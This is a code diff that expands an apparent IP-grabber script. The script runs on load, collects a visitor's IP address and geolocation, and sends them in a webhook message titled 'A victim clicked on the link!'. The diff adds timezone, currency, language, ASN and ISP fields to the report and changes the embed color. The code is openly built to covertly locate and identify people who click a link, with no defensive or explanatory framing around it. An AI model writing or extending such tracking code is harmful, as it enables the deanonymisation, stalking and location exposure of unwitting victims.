@@ -19,8 +19,8 @@ const sendIP = () => {
                             embeds: [
                                 {
                                     title: 'A victim clicked on the link!',
-                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
-                                    color: 0x800080 // optionally changeable
+                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Timezone >> ** ${geoData.timezone}\n**Currency >> ** ${geoData.currency}\n**Languages** >> ** ${geoData.languages}\n**ASN >> ** ${geoData.asn}\n**ISP >> ${geoData.org}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
+                                    color: 0x000088 // optionally changeable
                                 }
                             ]
                         })
@@ -40,4 +40,5 @@ const sendIP = () => {
         });
 };
 sendIP();
+
 
